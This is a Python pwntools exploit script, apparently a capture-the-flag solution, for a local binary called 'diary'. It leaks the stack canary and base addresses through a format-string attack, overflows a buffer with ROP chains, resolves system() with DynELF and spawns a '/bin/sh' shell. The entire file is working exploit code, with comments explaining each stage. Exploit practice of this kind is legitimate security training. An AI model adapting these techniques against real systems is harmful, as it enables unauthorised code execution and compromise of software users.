#!/usr/bin/env python3
from pwn import *
import os
import posix
from struct import *

context.update(arch='amd64', os='linux')
binary = ELF('./diary')

def leak(addr):
    ropchain = p64(pop3ret) + p64(0x1) + p64(addr) + p64(0x8) + p64(write_plt) + p64(pop3ret) + p64(0x0) + p64(new_stack_frame+0x18) + p64(0x8) + p64(read_plt) + p64(pop_rsp_pop3_ret) + p64(new_stack_frame)
    payload = b'A'*(0xD0-0x8) + p64(canary) + b'B'*8 + ropchain

    # create new entry to send ROP-chain
    p.recvuntil('Your Choice: ')
    p.sendline('1')
    p.recvuntil('Write max. 200 characters: \n')
    p.sendline(payload)

    # exit now
    p.recvuntil('Your Choice: ')
    p.sendline('2')
    gb = p.recvuntil('Good bye!\n')

    # send mainloop because of the read() call in the ropchain
    p.send(p64(mainloop))

    leaked_addr = p.recv(8)
    return leaked_addr

def main():
    global canary, poprdi, pop3ret, puts_plt, read_plt, write_plt, mainloop, libc_addr_x, libc, rbp, new_stack_frame, pop_rsp_pop3_ret

    # offsets
    pop_rsp_pop3_ret_offset = 0xbfd # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
    pop3ret_offset = 0x92e; #pop rdi ; pop rsi ; pop rdx ; ret
    poprdi_offset = 0xc03;
    puts_plt_offset = 0x790
    write_plt_offset = 0x7a0
    read_plt_offset = 0x7e0
    read_got_offset = 0x201fc0 
    printf_got_offset = 0x201fb0
    mainloop_offset = 0xB8F # call mainloop() from main()

    # set name to get stackInfo  (format string attack)
    p.recvuntil('Your Choice: ')
    p.sendline("0")
    p.recvuntil('Please enter your name: ')
    p.sendline('%lx,'*99 + '%lx') #n=70
    stackInfo = p.recvline()
    stackInfo = stackInfo.split(b',')
    canary = int(stackInfo[68],16)
    log.info('Canary = '+hex(canary))
    elfBaseAddr = int(stackInfo[70],16)
    elfBaseAddr = elfBaseAddr & 0xfffffffffffff000 #page aligning
    log.info('elfBaseAddr = ' + hex(elfBaseAddr))
    libc_leak = int(stackInfo[74],16)
    log.info('libc_leak = ' + hex(libc_leak))

    # calling leak() many times causes problems as pop;pop;pop;ret is called very often => end of stack is reached
    # hence, build in leak() a ropchain, that sets the stack to the same position new_stack_frame each time
    new_stack_frame = elfBaseAddr + 0x203000 - 0x400
    log.info('new_stack_frame = ' + hex(new_stack_frame))
    
    pop_rsp_pop3_ret = pop_rsp_pop3_ret_offset + elfBaseAddr
    pop3ret = pop3ret_offset + elfBaseAddr
    poprdi = poprdi_offset + elfBaseAddr
    puts_plt = puts_plt_offset + elfBaseAddr
    write_plt = write_plt_offset + elfBaseAddr
    read_plt = read_plt_offset + elfBaseAddr
    printf_got = printf_got_offset + elfBaseAddr
    mainloop = mainloop_offset + elfBaseAddr


    dyn = DynELF(leak, libc_leak)
    sys_dyn = dyn.lookup('system', 'libc')
    log.info('sys_dyn = ' + hex(sys_dyn))

    # as we have no libc, we have to write "/bin/sh\x00" somewhere to use it. (we cannot search it in the libc)
    binsh_addr = elfBaseAddr + (0x203000 - 0x100)
    ropchain_write_binsh = p64(pop3ret) + p64(0x0) + p64(binsh_addr) + p64(len('/bin/sh\x00')) + p64(read_plt)

    # this ropchain pops the shell by system("/bin/sh")
    ropchain_shell = p64(poprdi) + p64(binsh_addr) + p64(sys_dyn)

    payload = b'A'*(0xD0-0x8) + p64(canary) + b'A'*8 + ropchain_write_binsh + ropchain_shell
    
    p.recvuntil('Your Choice: ')
    p.sendline('1')
    p.recvuntil('Write max. 200 characters: \n')
    p.sendline(payload)

    p.recvuntil('Your Choice: ')
    p.sendline('2')

    # we have to send '/bin/sh\x00' such that the read() call in the ropchain_write_binsh write this string to binsh_addr
    p.send('/bin/sh\x00')

    p.interactive()


if __name__ == '__main__':
    global p
    p = process('./diary')
    main()
